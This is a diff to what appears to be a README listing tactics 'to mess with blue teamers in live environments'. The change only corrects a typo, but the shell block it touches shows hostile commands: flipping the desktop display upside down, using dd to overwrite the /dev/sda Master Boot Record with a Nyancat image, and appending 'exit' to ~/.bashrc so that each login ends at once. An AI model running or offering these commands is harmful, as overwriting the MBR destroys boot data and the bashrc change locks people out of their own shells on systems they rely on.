@@ -5,7 +5,7 @@ A small collection of tactics to mess with blue teamers in live environments...
 ```shell
 xrandr -o inverted # Flip X11 desktop session upside down.
 
-dd if=nyan.mbr of=/dev/sda # NyanMBR necessary, overwrites Master Boot Recrd with Nyancat animation. The MBR image can be found in this repository: https://github.com/brainsmoke/nyanmbr
+dd if=nyan.mbr of=/dev/sda # NyanMBR necessary, overwrites Master Boot Record with Nyancat animation. The MBR image can be found in this repository: https://github.com/brainsmoke/nyanmbr
 
 echo exit >> ~/.bashrc # Add a logout to the login script
 
